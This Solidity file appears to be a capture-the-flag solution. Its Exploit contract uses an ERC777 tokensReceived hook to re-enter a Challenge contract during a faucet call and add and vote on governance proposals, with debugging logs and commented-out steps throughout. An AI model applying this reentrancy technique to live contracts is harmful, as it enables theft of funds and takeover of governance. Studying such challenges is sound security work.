// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "./Challenge.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";

contract Exploit is IERC777Recipient {
    Challenge instance;
    IERC1820Registry internal constant _ERC1820_REGISTRY =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(Challenge _instance) payable {
        instance = _instance;
    }

    function finalize() external {
        _ERC1820_REGISTRY.setInterfaceImplementer(
            address(this),
            keccak256("ERC777Token"),
            address(this)
        );
        _ERC1820_REGISTRY.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensRecipient"),
            address(this)
        );

        // bool isOp = ERC777(instance.govTokens(0)).isOperatorFor(
        //     address(instance),
        //     address(this)
        // );
        // console.log("IS OPERATOR", isOp);

        console.log("FAUCET", instance.faucetUsed());
        console.log("TOKENS 1", instance.tokens(0));
        console.log("TOKENS 2", instance.tokens(1));
        // console.log("TOKENS 3", instance.tokens(2));

        // console.log("TOKENS 3", instance.tokens(2));

        instance.faucet();

        // isOp = ERC777(instance.govTokens(0)).isOperatorFor(
        //     address(instance),
        //     address(this)
        // );
        // console.log("IS OPERATOR", isOp);

        // uint256 balance = ERC20(instance.govTokens(0)).balanceOf(address(this));
        // console.log("BALANCE", balance);

        // ERC20(instance.tokens(0)).approve(address(instance), type(uint256).max);
        // instance.deposit(0, balance);

        // instance.withdraw(0);
        // console.log(
        //     "BALANCE",
        //     ERC20(instance.govTokens(0)).balanceOf(address(this))
        // );
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        console.log("TOKEN RECEIVED");
        console.log("THIS", address(this));
        console.log("SENDER", msg.sender);
        console.log("GOV TOKEN", address(instance.govTokens(0)));

        instance.addProposal(uint160(address(instance.govTokens(0))));
        instance.voteProposal(0, true);
        instance.voteProposal(1, true);
        instance.voteProposal(2, true);
        instance.voteProposal(3, true);
        instance.voteProposal(4, true);
        instance.voteProposal(5, true);

        console.log("FAUCET", instance.faucetUsed());
        console.log("TOKENS 1", instance.tokens(0));
        console.log("TOKENS 2", instance.tokens(1));
        console.log("TOKENS 3", instance.tokens(2));
        console.log("TOKENS 4", instance.tokens(3));

        instance.addProposal(2);

        // bytes memory data = abi.encodeWithSelector(
        //     ERC777.authorizeOperator.selector,
        //     address(this)
        // );

        // (bool success, ) = address(instance.govTokens(0)).delegatecall(data);
        // require(success, "FALLO DELEGATE");
    }
}
